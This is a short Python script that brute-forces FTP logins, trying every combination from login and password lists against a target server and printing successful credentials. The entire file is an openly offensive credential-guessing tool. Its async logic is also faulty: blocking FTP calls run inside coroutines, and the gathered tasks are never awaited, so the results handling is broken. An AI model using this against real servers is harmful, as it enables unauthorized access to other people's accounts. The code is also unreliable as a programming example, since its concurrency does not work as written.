from ftplib import FTP
import asyncio

async def ftp_try(target, port, login, password):
    try:
        ftp = FTP()
        ftp.connect(target, port, timeout=5)
        ftp.login(user=login, passwd=password)
        print(f"[SUCCESS] Login: {login} | Password: {password}")
        ftp.quit()
        return login, password
    except Exception as e:
        print(f"[ERROR] {e}")
        return None
    
async def ftp_bruteforce(target, port, login_list, password_list, rate_limit):
    tasks = []
    for login in login_list:
        for password in password_list:
            tasks.append(ftp_try(target, port, login, password))
            await asyncio.sleep(rate_limit)
    
    results = asyncio.gather(*tasks)
    return [res for res in results if res is not None]